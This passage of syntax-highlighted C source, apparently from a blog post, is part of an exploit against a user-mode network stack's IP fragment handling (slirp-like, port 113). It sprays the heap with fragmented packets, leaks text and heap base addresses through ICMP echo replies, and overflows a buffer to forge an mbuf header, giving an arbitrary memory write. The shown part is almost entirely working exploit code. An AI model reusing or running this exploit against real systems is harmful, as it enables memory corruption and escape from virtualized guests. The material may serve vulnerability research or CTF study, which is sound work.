class="title">t2</span>;</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">timezone</span> <span class="title">tz</span>;</span></span><br><span class="line">    <span class="type">double</span> dt;</span><br><span class="line"></span><br><span class="line">    (<span class="type">void</span>)gettimeofday(&amp;t1, &amp;tz);</span><br><span class="line">    wait.tv_sec = <span class="number">2</span>;</span><br><span class="line">    wait.tv_usec = <span class="number">0</span>;</span><br><span class="line">    setsockopt(recvsd, SOL_SOCKET, SO_RCVTIMEO, (<span class="type">char</span> *)&amp;wait,</span><br><span class="line">               <span class="keyword">sizeof</span>(<span class="keyword">struct</span> timeval));</span><br><span class="line">    recv_iphdr = (<span class="keyword">struct</span> ip *)(recv_ether_frame + ETH_HDRLEN);</span><br><span class="line">    recv_icmphdr = (<span class="keyword">struct</span> icmp *)(recv_ether_frame + ETH_HDRLEN + IP4_HDRLEN);</span><br><span class="line">    <span class="type">int</span> count = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">while</span> (<span class="number">1</span>) &#123;</span><br><span class="line">        <span class="built_in">memset</span>(recv_ether_frame, <span class="number">0</span>, IP_MAXPACKET * <span class="keyword">sizeof</span>(<span class="type">uint8_t</span>));</span><br><span class="line">        <span class="built_in">memset</span>(&amp;from, <span class="number">0</span>, <span class="keyword">sizeof</span>(from));</span><br><span class="line">        fromlen = <span class="keyword">sizeof</span>(from);</span><br><span class="line">        <span class="keyword">if</span> ((bytes = recvfrom(recvsd, recv_ether_frame, IP_MAXPACKET, <span class="number">0</span>,</span><br><span class="line">                              (<span class="keyword">struct</span> sockaddr *)&amp;from, &amp;fromlen)) &lt; <span class="number">0</span>) &#123;</span><br><span class="line">            status = errno;</span><br><span class="line">            <span class="keyword">if</span> (status == EAGAIN) &#123; <span class="comment">// EAGAIN = 11</span></span><br><span class="line">                dbg_printf(<span class="string">&quot;No reply within %li seconds.\n&quot;</span>, wait.tv_sec);</span><br><span class="line">                <span class="built_in">exit</span>(EXIT_FAILURE);</span><br><span class="line">            &#125; <span class="keyword">else</span> <span class="keyword">if</span> (status == EINTR) &#123; <span class="comment">// EINTR = 4</span></span><br><span class="line">                <span class="keyword">continue</span>;</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                perror(<span class="string">&quot;recvfrom() failed &quot;</span>);</span><br><span class="line">                <span class="built_in">exit</span>(EXIT_FAILURE);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125; <span class="comment">// End of error handling conditionals.</span></span><br><span class="line">        <span class="comment">// hexdump(&quot;recv&quot;, recv_ether_frame, 0x50);</span></span><br><span class="line">        dbg_printf(<span class="string">&quot;recv count %d\n&quot;</span>, count++);</span><br><span class="line">        <span class="keyword">if</span> ((((recv_ether_frame[<span class="number">12</span>] &lt;&lt; <span class="number">8</span>) + recv_ether_frame[<span class="number">13</span>]) ==</span><br><span class="line">             ETH_P_IP) &amp;&amp;</span><br><span class="line">            (recv_iphdr-&gt;ip_p == IPPROTO_ICMP) &amp;&amp;</span><br><span class="line">            (recv_icmphdr-&gt;icmp_type == ICMP_ECHOREPLY)) &#123;</span><br><span class="line">            <span class="comment">// Stop timer and calculate how long it took to get a reply.</span></span><br><span class="line">            (<span class="type">void</span>)gettimeofday(&amp;t2, &amp;tz);</span><br><span class="line">            dt = (<span class="type">double</span>)(t2.tv_sec - t1.tv_sec) * <span class="number">1000.0</span> +</span><br><span class="line">                 (<span class="type">double</span>)(t2.tv_usec - t1.tv_usec) / <span class="number">1000.0</span>;</span><br><span class="line">            <span class="comment">// 底下这个可能会segfault</span></span><br><span class="line">            <span class="comment">// if (inet_ntop(AF_INET, &amp;(recv_iphdr-&gt;ip_src.s_addr), rec_ip,</span></span><br><span class="line">            <span class="comment">// INET_ADDRSTRLEN) == NULL) &#123;</span></span><br><span class="line">            <span class="comment">//     status = errno;</span></span><br><span class="line">            <span class="comment">//     fprintf(stderr, &quot;inet_ntop() failed.\nError message: %s&quot;,</span></span><br><span class="line">            <span class="comment">//     strerror(status)); exit(EXIT_FAILURE);</span></span><br><span class="line">            <span class="comment">// &#125;</span></span><br><span class="line">            dbg_printf(<span class="string">&quot;%g ms (%i bytes received)\n&quot;</span>, dt, bytes);</span><br><span class="line"><span class="meta">#<span class="keyword">ifdef</span> DEBUG</span></span><br><span class="line">            hexdump(<span class="string">&quot;ping recv&quot;</span>, recv_ether_frame, bytes);</span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line">            <span class="keyword">if</span> (bytes &lt; <span class="number">0x200</span>)</span><br><span class="line">                <span class="keyword">continue</span>;</span><br><span class="line">            text_base =</span><br><span class="line">                    ((*(<span class="type">uint64_t</span> *)(recv_ether_frame + <span class="number">0x88</span>)) - <span class="number">0x7e7d01</span>) &amp; ~<span class="number">0xfff</span>;</span><br><span class="line">            heap_base = (*(<span class="type">uint64_t</span> *)(recv_ether_frame + <span class="number">0x90</span>)) &amp; ~<span class="number">0xffffff</span>;</span><br><span class="line">            dbg_printf(<span class="string">&quot;leak text_base: 0x%lx\n&quot;</span></span><br><span class="line">                       <span class="string">&quot;leak heap_base: 0x%lx\n&quot;</span>,</span><br><span class="line">                       text_base, heap_base);</span><br><span class="line">            <span class="comment">// getchar();</span></span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        &#125; <span class="comment">// End if IP ethernet frame carrying ICMP_ECHOREPLY</span></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">//getchar();</span></span><br><span class="line">    close(s);</span><br><span class="line">    close(recvsd);</span><br><span class="line">    <span class="built_in">free</span>(payload_start);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">arbitrary_write</span><span class="params">(<span class="type">uint64_t</span> addr, <span class="type">int</span> addr_len, <span class="type">uint8_t</span> *write_data,</span></span><br><span class="line"><span class="params">                    <span class="type">int</span> write_data_len, <span class="type">int</span> spray_times)</span> &#123;</span><br><span class="line">    <span class="type">int</span> s, len, i;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">sockaddr_in</span> <span class="title">ip_addr</span>;</span></span><br><span class="line">    <span class="type">int</span> ret;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">ip_pkt_info</span> <span class="title">pkt_info</span>;</span></span><br><span class="line"></span><br><span class="line">    <span class="type">uint8_t</span> *payload = (<span class="type">uint8_t</span> *)<span class="built_in">malloc</span>(IP_MAXPACKET);</span><br><span class="line">    <span class="type">uint8_t</span> *payload_start = payload;</span><br><span class="line">    <span class="type">uint32_t</span> *payload32 = (<span class="type">uint32_t</span> *)payload;</span><br><span class="line">    <span class="type">uint64_t</span> *payload64 = (<span class="type">uint64_t</span> *)payload;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">memset</span>(payload, <span class="string">&#x27;A&#x27;</span>, <span class="number">0x1000</span>);</span><br><span class="line">    <span class="built_in">memcpy</span>(payload, <span class="string">&quot;xmzyshypnc&quot;</span>, <span class="number">10</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; spray_times; ++i) &#123;</span><br><span class="line">        dbg_printf(<span class="string">&quot;spraying size 0x2000, id: %d\n&quot;</span>, i);</span><br><span class="line">        spray(<span class="number">0x2000</span>, g_spray_ip_id + i);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;[+]Now we spray to malloc all freed buf.\n&quot;</span>);</span><br><span class="line">    <span class="comment">//getchar();</span></span><br><span class="line">    dbg_printf(<span class="string">&quot;spray finished.\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">    s = socket(AF_INET, SOCK_STREAM, <span class="number">0</span>);</span><br><span class="line">    ip_addr.sin_family = AF_INET;</span><br><span class="line">    ip_addr.sin_addr.s_addr = inet_addr(host);</span><br><span class="line">    ip_addr.sin_port = htons(<span class="number">113</span>); <span class="comment">// vulnerable port</span></span><br><span class="line">    len = <span class="keyword">sizeof</span>(<span class="keyword">struct</span> sockaddr_in);</span><br><span class="line">    ret = connect(s, (<span class="keyword">struct</span> sockaddr *)&amp;ip_addr, len);</span><br><span class="line">    <span class="keyword">if</span> (ret == <span class="number">-1</span>) &#123;</span><br><span class="line">        perror(<span class="string">&quot;oops: client&quot;</span>);</span><br><span class="line">        <span class="built_in">exit</span>(<span class="number">1</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    pkt_info.ip_id = <span class="number">0xdead</span>;</span><br><span class="line">    pkt_info.ip_off = <span class="number">0</span>;</span><br><span class="line">    pkt_info.MF = <span class="number">1</span>;</span><br><span class="line">    pkt_info.ip_p = <span class="number">0xff</span>;</span><br><span class="line">    send_ip_pkt(&amp;pkt_info, payload, <span class="number">0x300</span> + <span class="number">4</span>); <span class="comment">// 这个packet就在so_rcv的后面</span></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;[+]Now we finished the malloc of so_rcv and the mbuf.\n&quot;</span>);</span><br><span class="line">    getchar();</span><br><span class="line"></span><br><span class="line">    <span class="comment">/*</span></span><br><span class="line"><span class="comment">        let&#x27;s overflow here!</span></span><br><span class="line"><span class="comment">        send(xxx)</span></span><br><span class="line"><span class="comment">    */</span></span><br><span class="line">    <span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; <span class="number">6</span>; ++i) &#123;</span><br><span class="line">        write(s, payload, <span class="number">0x500</span>); <span class="comment">// 不能send一个满的m_buf，因为会有一个off by</span></span><br><span class="line">        <span class="comment">// null = =。。。。</span></span><br><span class="line">        usleep(<span class="number">20000</span>); <span class="comment">// 不知道为，貌似内核会合并包？</span></span><br><span class="line">        <span class="comment">// 如果合并了就会off by null...</span></span><br><span class="line">        <span class="comment">// 所以sleep一下</span></span><br><span class="line">        dbg_printf(<span class="string">&quot;send %d complete\n&quot;</span>, i + <span class="number">1</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    write(s, payload, <span class="number">1072</span>);</span><br><span class="line">    <span class="comment">// actual overflow here</span></span><br><span class="line">    *payload64++ = <span class="number">0</span>;</span><br><span class="line">    *payload64++ = <span class="number">0x675</span>; <span class="comment">// chunk header</span></span><br><span class="line">    *payload64++ = <span class="number">0</span>;     <span class="comment">// m_next</span></span><br><span class="line">    *payload64++ = <span class="number">0</span>;     <span class="comment">// m_prev</span></span><br><span class="line">    *payload64++ = <span class="number">0</span>;     <span class="comment">// m_nextpkt</span></span><br><span class="line">    *payload64++ = <span class="number">0</span>;     <span class="comment">// m_prevpkt</span></span><br><span class="line">    payload32 = (<span class="type">uint32_t</span> *)payload64;</span><br><span class="line">    *payload32++ = <span class="number">0</span>;     <span class="comment">// m_flags</span></span><br><span class="line">    *payload32++ = <span class="number">0x608</span>; <span class="comment">// m_size</span></span><br><span class="line">    payload64 = (<span class="type">uint64_t</span> *)payload32;</span><br><span class="line">    *payload64++ = <span class="number">0</span>; <span class="comment">// m_so</span></span><br><span class="line">    payload = (<span class="type">uint8_t</span> *)payload64;</span><br><span class="line">    assert(addr_len &lt;= <span class="number">8</span>);</span><br><span class="line">    <span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; addr_len; ++i) &#123;</span><br><span class="line">        *payload++ = (addr &gt;&gt; (i * <span class="number">8</span>)) &amp; <span class="number">0xff</span>; <span class="comment">// m_data</span></span><br><span class="line">    &#125;</span><br><span class="line">    write(s, payload_start, (<span class="type">uint8_t</span> *)payload - payload_start);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;[+]Now we have written faked mbuf struct&quot;</span>);</span><br><span class="line">    <span class="comment">//getchar();</span></span><br><span class="line">    <span class="comment">// write(s, payload, 0x1000);</span></span><br><span class="line">    <span class="keyword">if</span> (stop_flag) &#123;</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">&quot;trigger!&quot;</span>);</span><br><span class="line">        getchar();</span><br><span class="line">    &#125;</span><br><span class="line">    pkt_info.ip_id = <span class="number">0xdead</span>;</span><br><span class="line">    pkt_info.ip_off = <span class="number">0x300</span> + <span class="number">24</span>;</span><br><span class="line">    pkt_info.MF = <span class="number">0</span>;</span><br><span class="line">    pkt_info.ip_p = <span class="number">0xff</span>;</span><br><span class="line">    send_ip_pkt(&amp;pkt_info, write_data, write_data_len);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;[+]Now we have trigger the written to target addr.\n&quot;</span>);</span><br><span class="line">    <span class="comment">//getchar();</span></span><br><span class="line"></span><br><span class="line">    close(s);</span><br><span class="line">    <span class="built_in">free</span>(payload_start);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 真正malloc的大小是payloadlen + 64</span></span><br><span class="line"><span class="type">void</span> <span class="title function_">send_ip_pkt</span><span class="params">(<span class="keyword">struct</span> ip_pkt_info *pkt_info, <span class="type">uint8_t</span> *payload,</span></span><br><span class="line"><span class="params">                 <span class="type">int</span> payloadlen)</span> &#123;</span><br><span class="line">    <span class="type">int</span> status, sd, *ip_flags, *tcp_flags;</span><br><span class="line">    <span class="type">const</span> <span class="type">int</span> on = <span class="number">1</span>;</span><br><span class="line">    <span class="type">char</span> *interface, *src_ip, *dst_ip;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">ip</span> <span class="title">iphdr</span>;</span></span><br><span class="line">    <span class="type">uint8_t</span> *packet;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">sockaddr_in</span> <span class="title">sin</span>;</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">ifreq</span> <span class="title">ifr</span>;</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">// Allocate memory for various arrays.</span></span><br><span class="line">    packet = allocate_ustrmem(IP_MAXPACKET);</span><br><span class="line">    interface = allocate_strmem(<span class="number">40</span>);</span><br><span class="line">    src_ip = allocate_strmem(INET_ADDRSTRLEN);</span><br><span class="line">    dst_ip = allocate_strmem(INET_ADDRSTRLEN);</span><br><span class="line">    ip_flags = allocate_intmem(<span class="number">4</span>);</span><br><span class="line">    tcp_flags = allocate_intmem(<span class="number">8</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Interface to send packet through.</span></span><br><span class="line">    <span class="built_in">strcpy</span>(interface, g_interface);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Submit request for a socket descriptor to look up interface.</span></span><br><span class="line">    <span class="keyword">if</span> ((sd = socket(AF_INET, SOCK_RAW, IPPROTO_RAW)) &lt; <span class="number">0</span>) &#123;</span><br><span class="line">        perror(<span class="string">&quot;socket() failed to get socket descriptor for using ioctl() &quot;</span>);</span><br><span class="line">        <span class="built_in">exit</span>(EXIT_FAILURE);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Use ioctl() to look up interface index which we will use to</span></span><br><span class="line">    <span class="comment">// bind socket descriptor sd to specified interface with setsockopt() since</span></span><br><span class="line">    <span class="comment">// none of the other arguments of sendto() specify which interface to use.</span></span><br><span class="line">    <span class="built_in">memset</span>(&amp;ifr, <span class="number">0</span>, <span class="keyword">sizeof</span>(ifr));</span><br><span class="line">    <span class="built_in">snprintf</span>(ifr.ifr_name, <span class="keyword">sizeof</span>(ifr.ifr_name), <span class="string">&quot;%s&quot;</span>, interface);</span><br><span class="line">    <span class="keyword">if</span> (ioctl(sd, SIOCGIFINDEX, &amp;ifr) &lt; <span class="number">0</span>) &#123;</span><br><span class="line">        perror(<span class="string">&quot;ioctl() failed to find interface &quot;</span>);</span><br><span class="line">        <span class="built_in">exit</span>(EXIT_FAILURE);</span><br><span class="line">    &#125;</span><br><span class="line">    close(sd);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Source IPv4 address: you need to fill this out</span></span><br><span class="line">    <span class="built_in">strcpy</span>(src_ip, <span class="string">&quot;127.0.0.1&quot;</span>);</span><br><span class="line">    <span class="built_in">strcpy</span>(dst_ip, <span class="string">&quot;127.0.0.1&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// IPv4 header</span></span><br><span class="line">    <span class="comment">// IPv4 header length (4 bits): Number of 32-bit words in header = 5</span></span><br><span class="line">    iphdr.ip_hl = IP4_HDRLEN / <span class="keyword">sizeof</span>(<span class="type">uint32_t</span>);</span><br><span class="line">    <span class="comment">// Internet Protocol version (4 bits): IPv4</span></span><br><span class="line">    iphdr.ip_v = <span class="number">4</span>;</span><br><span class="line">    <span class="comment">// Type of service (8 bits)</span></span><br><span class="line">    iphdr.ip_tos = <span class="number">0</span>;</span><br><span class="line">    <span class="comment">// Total length of datagram (16 bits): IP header + TCP header + TCP data</span></span><br><span class="line">    iphdr.ip_len = htons(IP4_HDRLEN + payloadlen);</span><br><span class="line">    <span class="comment">// ID sequence number (16 bits): unused, since single datagram</span></span><br><span class="line">    iphdr.ip_id = htons(pkt_info-&gt;ip_id);</span><br><span class="line">    <span class="comment">// Flags, and Fragmentation offset (3, 13 bits): 0 since single datagram</span></span><br><span class="line">    <span class="comment">// Zero (1 bit)</span></span><br><span class="line">    ip_flags[<span class="number">0</span>] = <span class="number">0</span>;</span><br><span class="line">    <span class="comment">// Do not fragment flag (1 bit)</span></span><br><span class="line">    ip_flags[<span class="number">1</span>] = <span class="number">0</span>;</span><br><span class="line">    <span class="comment">// More fragments following flag (1 bit)</span></span><br><span class="line">    ip_flags[<span class="number">2</span>] = pkt_info-&gt;MF;</span><br><span class="line">    <span class="comment">// Fragmentation offset (13 bits)</span></span><br><span class="line">    ip_flags[<span class="number">3</span>] = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">    iphdr.ip_off =</span><br><span class="line">            htons((ip_flags[<span class="number">0</span>] &lt;&lt; <span class="number">15</span>) + (ip_flags[<span class="number">1</span>] &lt;&lt; <span class="number">14</span>) + (ip_flags[<span class="number">2</span>] &lt;&lt; <span class="number">13</span>) +</span><br><span class="line">                  ip_flags[<span class="number">3</span>] + (pkt_info-&gt;ip_off &gt;&gt; <span class="number">3</span>));</span><br><span class="line">    <span class="comment">// Time-to-Live (8 bits): default to maximum value</span></span><br><span class="line">    iphdr.ip_ttl = <span class="number">255</span>;</span><br><span class="line">    <span class="comment">// Transport layer protocol (8 bits): 6 for TCP</span></span><br><span class="line">    iphdr.ip_p = pkt_info-&gt;ip_p;</span><br><span class="line">    <span class="comment">// iphdr.ip_p = IPPROTO_TCP;</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">// Source IPv4 address (32 bits)</span></span><br><span class="line">    <span class="keyword">if</span> ((status = inet_pton(AF_INET, src_ip, &amp;(iphdr.ip_src))) != <span class="number">1</span>) &#123;</span><br><span class="line">        dbg_printf(<span class="string">&quot;inet_pton() failed.\nError message: %s&quot;</span>, strerror(status));</span><br><span class="line">        <span class="built_in">exit</span>(EXIT_FAILURE);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Destination IPv4 address (32 bits)</span></span><br><span class="line">    <span class="keyword">if</span> ((status = inet_pton(AF_INET, dst_ip, &amp;(iphdr.ip_dst))) != <span class="number">1</span>) &#123;</span><br><span class="line">        dbg_printf(<span class="string">&quot;inet_pton() failed.\nError message: %s&quot;</span>, strerror(status));</span><br><span class="line">        <span class="built_in">exit</span>(EXIT_FAILURE);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// IPv4 header checksum (16 bits): set to 0 when calculating checksum</span></span><br><span class="line">    iphdr.ip_sum = <span class="number">0</span>;</span><br><span class="line">    iphdr.ip_sum = checksum((<span class="type">uint16_t</span> *)&amp;iphdr, IP4_HDRLEN);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Prepare packet.</span></span><br><span class="line">    <span class="comment">// First part is an IPv4 header.</span></span><br><span class="line">    <span class="built_in">memcpy</span>(packet, &amp;iphdr, IP4_HDRLEN * <span class="keyword">sizeof</span>(<span class="type">uint8_t</span>));</span><br><span class="line">    <span class="comment">// Last part is upper layer protocol data.</span></span><br><span class="line">    <span class="built_in">memcpy</span>((packet + IP4_HDRLEN), payload, payloadlen * <span class="keyword">sizeof</span>(<span class="type">uint8_t</span>));</span><br><span class="line"></span><br><span class="line">    <span class="comment">// The kernel is going to prepare layer 2 information (ethernet frame</span></span><br><span class="line">    <span class="comment">// header) for us. For that, we need to specify a destination for the kernel</span></span><br><span class="line">    <span class="comment">// in order for it to decide where to send the raw datagram. We fill in a</span></span><br><span class="line">    <span class="comment">// struct in_addr with the desired destination IP address, and pass this</span></span><br><span class="line">    <span class="comment">// structure to the sendto() function.</span></span><br><span class="line">    <span class="built_in">memset</span>(&amp;<span class="built_in">sin</span>, <span class="number">0</span>, <span class="keyword">sizeof</span>(<span class="keyword">struct</span> sockaddr_in));</span><br><span class="line">    <span class="built_in">sin</span>.sin_family = AF_INET;</span><br><span class="line">    <span class="built_in">sin</span>.sin_addr.s_addr = iphdr.ip_dst.s_addr;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Submit request for a raw socket descriptor.</span></span><br><span class="line">    <span class="keyword">if</span> ((sd = socket(AF_INET, SOCK_RAW, IPPROTO_RAW)) &lt; <span class="number">0</span>) &#123;</span><br><span class="line">        perror(<span class="string">&quot;socket() failed &quot;</span>);</span><br><span class="line">        <span class="built_in">exit</span>(EXIT_FAILURE);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Set flag so socket expects us to provide IPv4 header.</span></span><br><span class="line">    <span class="keyword">if</span> (setsockopt(sd, IPPROTO_IP, IP_HDRINCL, &amp;on, <span class="keyword">sizeof</span>(on)) &lt; <span class="number">0</span>) &#123;</span><br><span class="line">        perror(<span class="string">&quot;setsockopt() failed to set IP_HDRINCL &quot;</span>);</span><br><span class="line">        <span class="built_in">exit</span>(EXIT_FAILURE);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Bind socket to interface index.</span></span><br><span class="line">    <span class="keyword">if</span> (setsockopt(sd, SOL_SOCKET, SO_BINDTODEVICE, &amp;ifr, <span class="keyword">sizeof</span>(ifr)) &lt; <span class="number">0</span>) &#123;</span><br><span class="line">        perror(<span class="string">&quot;setsockopt() failed to bind to interface &quot;</span>);</span><br><span class="line">        <span class="built_in">exit</span>(EXIT_FAILURE);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Send packet.</span></span><br><span class="line">    <span class="keyword">if</span> (sendto(sd, packet, IP4_HDRLEN + TCP_HDRLEN + payloadlen, <span class="number">0</span>,</span><br><span class="line">               (<span class="keyword">struct</span> sockaddr *)&amp;<span class="built_in">sin</span>, <span class="keyword">sizeof</span>(<span class="keyword">struct</span> sockaddr)) &lt; <span class="number">0</span>) &#123;</span><br><span class="line">        perror(<span class="string">&quot;sendto() failed &quot;</span>);</span><br><span class="line">        <span class="built_in">exit</span>(EXIT_FAILURE);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Close socket descriptor.</span></span><br><span class="line">    close(sd);</span><br><span class="line">    <span class="comment">// Free allocated memory.</span></span><br><span class="line">    <span class="built_in">free</span>(packet);</span><br><span class="line">    <span class="built_in">free</span>(interface);</span><br><span class="line">    <span class="built_in">free</span>(src_ip);</span><br><span class="line">    <span class="built_in">free</span>(dst_ip);</span><br><span class="line">    <span class="built_in">free</span>(ip_flags);</span><br><span class="line">    <span class="built_in">free</span>(tcp_flags);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">spray</span><span class="params">(<span class="type">int</span> size, <span class="type">uint16_t</span> ip_id)</span> &#123;</span><br><span class="line">    <span class="type">int</span> i, status, sd, *ip_flags, *tcp_flags;</span><br><span class="line">    <span class="type">const</span> <span class="type">int</span> on = <span class="number">1</span>;</span><br><span class="line">    <span class="type">char</span> *interface, *src_ip, *dst_ip;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">ip</span> <span class="title">iphdr</span>;</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">tcphdr</span> <span class="title">tcphdr</span>;</span></span><br><span class="line">    <span class="type">char</span> *payload;</span><br><span class="line">    <span class="type">int</span> payloadlen;</span><br><span class="line">    <span class="type">uint8_t</span> *packet;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">sockaddr_in</span> <span class="title">sin</span>;</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">ifreq</span> <span class="title">ifr</span>;</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">// Allocate memory for various arrays.</span></span><br><span class="line">    packet = allocate_ustrmem(IP_MAXPACKET);</span><br><span class="line">    interface = allocate_strmem(<span class="number">40</span>);</span><br><span class="line">    src_ip = allocate_strmem(INET_ADDRSTRLEN);</span><br><span class="line">    dst_ip = allocate_strmem(INET_ADDRSTRLEN);</span><br><span class="line">    ip_flags = allocate_intmem(<span class="number">4</span>);</span><br><span class="line">    tcp_flags = allocate_intmem(<span class="number">8</span>);</span><br><span class="line">    payload = allocate_strmem(IP_MAXPACKET);</span><br><span class="line"></span><br><span class="line">    payloadlen = size - <span class="number">84</span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Interface to send packet through.</span></span><br><span class="line">    <span class="built_in">strcpy</span>(interface, g_interface);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Submit request for a socket descriptor to look up interface.</span></span><br><span class="line">    <span class="keyword">if</span> ((sd = socket(AF_INET, SOCK_RAW, IPPROTO_RAW)) &lt; <span class="number">0</span>) &#123;</span><br><span class="line">        perror(<span class="string">&quot;socket() failed to get socket descriptor for using ioctl() &quot;</span>);</span><br><span class="line">        <span class="built_in">exit</span>(EXIT_FAILURE);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Use ioctl() to look up interface index which we will use to</span></span><br><span class="line">    <span class="comment">// bind socket descriptor sd to specified interface with setsockopt() since</span></span><br><span class="line">    <span class="comment">// none of the other arguments of sendto() specify which interface to use.</span></span><br><span class="line">    <span class="built_in">memset</span>(&amp;ifr, <span class="number">0</span>, <span class="keyword">sizeof</span>(ifr));</span><br><span class="line">    <span class="built_in">snprintf</span>(ifr.ifr_name, <span class="keyword">sizeof</span>(ifr.ifr_name), <span class="string">&quot;%s&quot;</span>, interface);</span><br><span class="line">    <span class="keyword">if</span> (ioctl(sd, SIOCGIFINDEX, &amp;ifr) &lt; <span class="number">0</span>) &#123;</span><br><span class="line">        perror(<span class="string">&quot;ioctl() failed to find interface &quot;</span>);</span><br><span class="line">        <span class="built_in">exit</span>(EXIT_FAILURE);</span><br><span class="line">    &#125;</span><br><span class="line">    close(sd);</span><br><span class="line">    <span class="comment">// dbg_printf(&quot;Index for interface %s is %i\n&quot;, interface, ifr.ifr_ifindex);</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">// Source IPv4 address: you need to fill this out</span></span><br><span class="line">    <span class="built_in">strcpy</span>(src_ip, <span class="string">&quot;127.0.0.1&quot;</span>);</span><br><span class="line">    <span class="built_in">strcpy</span>(dst_ip, <span class="string">&quot;127.0.0.1&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// IPv4 header</span></span><br><span class="line">    <span class="comment">// IPv4 header length (4 bits): Number of 32-bit words in header = 5</span></span><br><span class="line">    iphdr.ip_hl = IP4_HDRLEN / <span class="keyword">sizeof</span>(<span class="type">uint32_t</span>);</span><br><span class="line">    <span class="comment">// Internet Protocol version (4 bits): IPv4</span></span><br><span class="line">    iphdr.ip_v = <span class="number">4</span>;</span><br><span class="line">    <span class="comment">// Type of service (8 bits)</span></span><br><span class="line">    iphdr.ip_tos = <span class="number">0</span>;</span><br><span class="line">    <span class="comment">// Total length of datagram (16 bits): IP header + TCP header + TCP data</span></span><br><span class="line">    iphdr.ip_len = htons(IP4_HDRLEN + TCP_HDRLEN + payloadlen);</span><br><span class="line">    <span class="comment">// ID sequence number (16 bits): unused, since single datagram</span></span><br><span class="line">    iphdr.ip_id = htons(ip_id);</span><br><span class="line">    <span class="comment">// Flags, and Fragmentation offset (3, 13 bits): 0 since single datagram</span></span><br><span class="line">    <span class="comment">// Zero (1 bit)</span></span><br><span class="line">    ip_flags[<span class="number">0</span>] = <span class="number">0</span>;</span><br><span class="line">    <span class="comment">// Do not fragment flag (1 bit)</span></span><br><span class="line">    ip_flags[<span class="number">1</span>] = <span class="number">0</span>;</span><br><span class="line">    <span class="comment">// More fragments following flag (1 bit)</span></span><br><span class="line">    ip_flags[<span class="number">2</span>] = <span class="number">1</span>;</span><br><span class="line">    <span class="comment">// Fragmentation offset (13 bits)</span></span><br><span class="line">    ip_flags[<span class="number">3</span>] = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">    iphdr.ip_off = htons((ip_flags[<span class="number">0</span>] &lt;&lt; <span class="number">15</span>) + (ip_flags[<span class="number">1</span>] &lt;&lt; <span class="number">14</span>) +</span><br><span class="line">                         (ip_flags[<span class="number">2</span>] &lt;&lt; <span class="number">13</span>) + ip_flags[<span class="number">3</span>]);</span><br><span class="line">    <span class="comment">// Time-to-Live (8 bits): default to maximum value</span></span><br><span class="line">    iphdr.ip_ttl = <span class="number">255</span>;</span><br><span class="line">    <span class="comment">// Transport layer protocol (8 bits): 6 for TCP</span></span><br><span class="line">    iphdr.ip_p = IPPROTO_TCP;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Source IPv4 address (32 bits)</span></span><br><span class="line">    <span class="keyword">if</span> ((status = inet_pton(AF_INET, src_ip, &amp;(iphdr.ip_src))) != <span class="number">1</span>) &#123;</span><br><span class="line">        dbg_printf(<span 